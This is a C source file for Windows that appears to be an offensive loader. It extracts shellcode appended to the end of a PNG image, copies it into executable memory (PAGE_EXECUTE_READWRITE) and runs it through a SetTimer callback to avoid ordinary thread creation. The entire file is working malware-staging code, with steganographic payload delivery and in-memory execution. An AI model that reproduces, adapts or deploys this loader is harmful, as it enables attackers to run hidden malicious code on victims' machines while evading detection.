/*
 * Resources:
 * - https://github.com/WafflesExploits/hide-payload-in-images/blob/main/code/payload-extractor/payload-extractor-from-file/payload-extractor-from-file.cpp
 *
 */

#include <windows.h>
#include <stdio.h>

#define EMBEDDED_IMAGE_PATH "embedded.png" // Replace it with the actual embedded image file path
#define ORIGINAL_IMAGE_SIZE 45218 // Replace it with the original image file size as bytes

BOOL GetFileSize(const char* filename, long int* pSize) {
	FILE* pFile = NULL;
	fopen_s(&pFile, filename, "rb");
	if (pFile == NULL) {
		printf("Error: Unable to open file: %s\n", filename);
		return FALSE;
	}

	if (fseek(pFile, 0, SEEK_END) != 0) {
		printf("Error: Unable to seek to the end of file: %s\n", filename);
		fclose(pFile);
		return FALSE;
	}

	// Get the current file pointer (size)
	long int dwSize = ftell(pFile);
	if (dwSize == -1L) {
		printf("Error: Unable to determine the size of file: %s\n", filename);
		fclose(pFile);
		return FALSE;
	}

	fclose(pFile);
	*pSize = dwSize;
	return TRUE;
}

BOOL ExtractPayload(unsigned char** pPayload, size_t* pdwPayloadSize) {
	printf("[#] Fetching image from %s...\n", EMBEDDED_IMAGE_PATH);
	// Get the size of the embedded image
	long int dwImageSize;
	if (!GetFileSize(EMBEDDED_IMAGE_PATH, &dwImageSize)) {
		return FALSE;
	}

	// Validate sizes
	if (ORIGINAL_IMAGE_SIZE > dwImageSize) {
		printf("Error: The original image size (%ld bytes) is larger than the embedded image size (%ld bytes)\n", ORIGINAL_IMAGE_SIZE, dwImageSize);
		return FALSE;
	}

	// Calculate the payload size
	long int dwPayloadSize = dwImageSize - ORIGINAL_IMAGE_SIZE;
	if (dwPayloadSize == 0) {
		printf("Error: No payload found in the image\n");
		return FALSE;
	}

	printf("[i] Payload size to extract from file: %ld bytes\n", dwPayloadSize);

	// Allocate memory for the payload
	unsigned char* pPayloadBuffer = (unsigned char*)malloc(dwPayloadSize);
	if (pPayloadBuffer == NULL) {
		printf("Error: Unable to allocate memory for payload\n");
		return FALSE;
	}

	// Open the embedded image file for reading
	FILE* pImageFile = NULL;
	fopen_s(&pImageFile, EMBEDDED_IMAGE_PATH, "rb");
	if (pImageFile == NULL) {
		printf("Error: Unable to open file: %s\n", EMBEDDED_IMAGE_PATH);
		free(pPayloadBuffer);
		pPayloadBuffer = NULL;
		return FALSE;
	}

	// Moves the file pointer to the position where the payload begins (original size)
	if (fseek(pImageFile, ORIGINAL_IMAGE_SIZE, SEEK_SET) != 0) {
		printf("Error: Unable to seek to position %ld in file: %s\n", ORIGINAL_IMAGE_SIZE, EMBEDDED_IMAGE_PATH);
		fclose(pImageFile);
		free(pPayloadBuffer);
		pPayloadBuffer = NULL;
		return FALSE;
	}

	// Read <payload_size> bytes from the embedded image file into the allocated buffer
	size_t dwBytesRead = fread(pPayloadBuffer, 1, dwPayloadSize, pImageFile);
	if (dwBytesRead != dwPayloadSize) {
		printf("Error: Unable to read the expected payload size from file: %s\n", EMBEDDED_IMAGE_PATH);
		fclose(pImageFile);
		free(pPayloadBuffer);
		pPayloadBuffer = NULL;
		return FALSE;
	}

	fclose(pImageFile);
	*pPayload = pPayloadBuffer;
	*pdwPayloadSize = dwPayloadSize;
	return TRUE;
}

BOOL ExecutePayload(unsigned char* pPayload, size_t dwPayloadSize) {
	LPVOID pShellcodeAddr = VirtualAlloc(NULL, dwPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pShellcodeAddr == NULL) {
		printf("Error: VirtualAlloc failed: %d\n", GetLastError());
		return FALSE;
	}

	memcpy(pShellcodeAddr, pPayload, dwPayloadSize);
	free(pPayload);

	printf("[#] Executing payload...\n");

	UINT_PTR dummy = 0;
	MSG msg;

	SetTimer(NULL, dummy, NULL, (TIMERPROC)pShellcodeAddr);
	GetMessageW(&msg, NULL, 0, 0);
	DispatchMessageW(&msg);

	VirtualFree(pShellcodeAddr, dwPayloadSize, MEM_RELEASE);

	return TRUE;
}

int main() {
	unsigned char* pPayload = NULL;
	size_t dwPayloadSize = 0;

	if (!ExtractPayload(&pPayload, &dwPayloadSize)) {
		printf("Error: Unable to extract payload from image\n");
		return EXIT_FAILURE;
	}

	if (!ExecutePayload(pPayload, dwPayloadSize)) {
		printf("Error: Unable to execute payload\n");
		return EXIT_FAILURE;
	}

	return EXIT_SUCCESS;
}